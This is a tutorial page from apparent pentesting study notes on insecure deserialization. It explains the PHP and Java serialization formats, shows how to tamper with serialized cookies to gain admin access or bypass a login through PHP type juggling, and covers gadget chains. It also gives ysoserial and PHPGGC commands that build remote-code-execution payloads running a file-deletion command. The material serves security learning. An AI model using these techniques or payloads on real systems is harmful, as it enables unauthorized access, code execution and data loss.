---
title: "Insecure deserialization"
weight: 14
description: "Explore insecure deserialization in web applications, including attack vectors, object manipulation, gadget chains, and tools like ysoserial and PHPGGC for exploitation."
---

<details><summary>General info</summary>

* Serialization is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes.

- Deserialization is the process of restoring this byte stream to a fully functional replica of the original object.

* Some languages serialize objects into binary formats, whereas others use different string formats, with varying degrees of human readability.

- To prevent a field from being serialized, it must be explicitly marked as "transient" in the class declaration.

* Insecure deserialization arises because there is a general lack of understanding of how dangerous deserializing user-controllable data can be.

</details>

<details><summary>PHP serialization format</summary>

```php
$user->name = "carlos";
$user->isLoggedIn = true;
```

```php
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

The native methods for PHP serialization are `serialize()` and `unserialize()`. If you have source code access, you should start by looking for `unserialize()` anywhere in the code and investigating further.

</details>

<details><summary>Java serialization format</summary>

* Some languages, such as Java, use binary serialization formats

- Serialized Java objects always begin with the same bytes, which are encoded as `ac ed` in hexadecimal and `rO0` in Base64.

* Any class that implements the interface `java.io.Serializable` can be serialized and deserialized. If you have source code access, take note of any code that uses the `readObject()` method, which is used to read and deserialize data from an `InputStream`.

</details>

**Important**: a serialized object may not be obvious at first view. Example:

```bash
%7b%22token%22%3a%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6InRlc3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiZmx6bnQ3ZTRwYTNobGpnN3dpejJkeGxuMHVyN3VkNjYiO30%3d%22%2c%22sig_hmac_sha1%22%3a%226d68c7db6f6b4d5abc5e84acea971fd72d217202%22%7d
```

URL decode

```json
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6InRlc3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiZmx6bnQ3ZTRwYTNobGpnN3dpejJkeGxuMHVyN3VkNjYiO30=","sig_hmac_sha1":"6d68c7db6f6b4d5abc5e84acea971fd72d217202"}
```

Base64 token decoding&#x20;

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"flznt7e4pa3hljg7wiz2dxln0ur7ud66";}
```

---

## Manipulating serialized objects

* You can either edit the object directly in its byte stream form
* You can write a short script in the corresponding language to create and serialize the new object yourself

### Modifying object attributes

```php
$user = unserialize($_COOKIE);
if ($user->isAdmin === true) {
// allow access to admin interface
}
```

1. Identify serialized object (here in the cookie)
2. Decode it

    ```php
    O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
    ```

3. Modify attributes&#x20;

    ```php
    O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;}
    ```

4. Re-encode the object and overwrite (the cookie)

> **Note**: This simple scenario is not common in the wild.


### Modifying data types

PHP -> if you perform a loose comparison `==` between an integer and a string, PHP will attempt to convert the string to an integer, meaning that `5 == "5"` evaluates to `true`.

```php
0 == "Example string" // true
```

```php
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
    // log in successfully
}
```

Attacker can modify the password attribute so that it contained the integer `0` -> authentication bypass.

> **Note**:
> * This is only possible because deserialization preserves the data type.
> * When modifying data types in any serialized object format, update any type labels and length indicators in the serialized data too (Otherwise, the serialized object will be corrupted and will not be deserialized).

---

## Using application functionality

* Consider "Delete user" functionality, the user's profile picture is deleted by accessing the file path in the $user->image\_location attribute
* If this $user was created from a serialized object, an attacker could exploit this by passing in a modified object with the image\_location set to an arbitrary file path

---

## Magic methods

* Magic methods are a special type of method that are automatically triggered by specific events or scenarios, without explicit invocation. Developers use them to define code execution for these events (e.g., `__construct()`). Some languages have magic methods that are invoked automatically during deserialization.
* In Java deserialization, the `ObjectInputStream.readObject()` method is used to read data from the initial byte stream and essentially acts like a constructor for "re-initializing" a serialized object.

    ```java
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
    {
        // implementation
    }
    ```

* They allow you to pass data from a serialized object into the website's code before the object is fully deserialized.

---

## Injecting arbitrary objects

Deserialization methods often don't validate the objects they process. Attackers can pass any serializable class, allowing them to instantiate arbitrary classes. With source code access, you can:

* Identify classes with deserialization magic methods
* Check if they perform unsafe operations on controllable data
* Then pass in a serialized object of this class to use its magic method for an exploit.

---

## Gadget chains

* A "gadget" is a code snippet in an application that helps an attacker achieve a goal, such as invoking a method to pass input into another gadget. Many insecure deserialization vulnerabilities are exploitable through gadget chains.
* Identifying gadget chains manually is arduous and nearly impossible without source code access. But if a gadget chain in Java's Apache Commons Collections library is exploitable on one website, other websites using this library may also be vulnerable.

### Tools (ysoserial , PHPGGC)

They lets you select a provided gadget chain for a target library, input a command to execute, and generates a serialized object. This reduces the manual effort of crafting gadget chains, though some trial and error is still needed.

**Java**

```bash
# Tool: https://github.com/frohoff/ysoserial
java -jar ysoserial-all.jar CommonsCollections4 "rm /tmp/file.txt"
# Probably you need to encode the payload into base64
java -jar ysoserial-all.jar CommonsCollections4 "rm /tmp/file.txt" | base64 -w 0
```

**PHP**

```sh
# Tool: https://github.com/ambionics/phpggc
./phpggc -b Symfony/RCE7 system "rm /tmp/file.txt"
```

> **Note**: 
> * Pay attention if you need to encode (e.g. URL encode) your payload
> * A payload might work even if the server returns an error...

### Working with documented gadget chains

If no dedicated tool exists for exploiting known gadget chains in the target application's framework, consider searching online for documented exploits to adapt manually.
